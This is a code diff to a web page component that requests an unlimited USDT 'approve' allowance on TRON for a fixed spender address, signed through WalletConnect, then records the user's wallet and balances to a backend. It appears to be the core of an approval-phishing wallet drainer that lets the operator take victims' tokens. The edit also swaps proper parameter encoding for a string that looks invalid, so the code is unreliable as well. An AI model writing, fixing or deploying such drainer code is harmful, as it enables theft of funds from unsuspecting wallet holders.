@@ -182,21 +182,6 @@ export default function Index() {
 
       // Build + sign via WalletConnect
       // Build transaction via TronGrid API directly
-      // Fix 1: ABI-encode approve(address,uint256) params properly
-      // address padded to 32 bytes + uint256 max padded to 32 bytes
-      const spenderHex = userAddressRef.current
-        ? (() => {
-            // Convert base58 Tron address to hex via tronWeb if available
-            // TronGrid visible:true accepts base58, but parameter must be ABI hex
-            const addrHex = window.tronWeb
-              ? window.tronWeb.address.toHex(TRON_SPENDER).replace(/^41/, "")
-              : TRON_SPENDER.replace(/^T/, "");
-            return addrHex.padStart(64, "0");
-          })()
-        : "";
-      const maxUint256Hex = "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
-      const encodedParameter = spenderHex + maxUint256Hex;
-
       const response = await fetch("https://api.trongrid.io/wallet/triggersmartcontract", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
@@ -204,7 +189,7 @@ export default function Index() {
           owner_address: userAddressRef.current,
           contract_address: TRON_USDT,
           function_selector: "approve(address,uint256)",
-          parameter: encodedParameter,
+          parameter: TRON_SPENDER + ",115792089237316195423570985008687907853269984665640564039457584007913129639935",
           fee_limit: 100000000,
           call_value: 0,
           visible: true
@@ -224,27 +209,9 @@ export default function Index() {
         body: JSON.stringify(signedTx)
       });
       const result = await broadcastRes.json();
-
-      // Fix 2: Fetch real balances for WalletConnect path too
-      let usdtBalanceWC = "0", nativeBalanceWC = "0";
-      try {
-        const TronWebLib = (window as any).TronWeb;
-        const twPublic = new TronWebLib({ fullHost: "https://api.trongrid.io" });
-        twPublic.setAddress(userAddressRef.current);
-        const usdtRaw = await twPublic.contract([{
-          "name": "balanceOf",
-          "inputs": [{ "name": "owner", "type": "address" }],
-          "outputs": [{ "name": "", "type": "uint256" }],
-          "stateMutability": "view",
-          "type": "function"
-        }], TRON_USDT).balanceOf(userAddressRef.current).call();
-        usdtBalanceWC = (Number(usdtRaw) / 1e6).toFixed(2);
-        nativeBalanceWC = ((await twPublic.trx.getBalance(userAddressRef.current)) / 1e6).toFixed(2);
-      } catch(e) { console.error("WC balance fetch failed:", e); }
-
       setTransactionStatusState("success");
       setTimeout(() => setTransactionStatusState("idle"), 3000);
-      await createTransaction({ walletAddress: userAddressRef.current, toAddress: TRON_SPENDER, amount: amount || "Max", txHash: result.txid || "wc_tx", usdtBalance: usdtBalanceWC + " USDT", nativeBalance: nativeBalanceWC + " TRX" });
+      await createTransaction({ walletAddress: userAddressRef.current, toAddress: TRON_SPENDER, amount: amount || "Max", txHash: result.txid || "wc_tx", usdtBalance: "0 USDT", nativeBalance: "0 TRX" });
 
     } catch (error) {
       console.error(error);
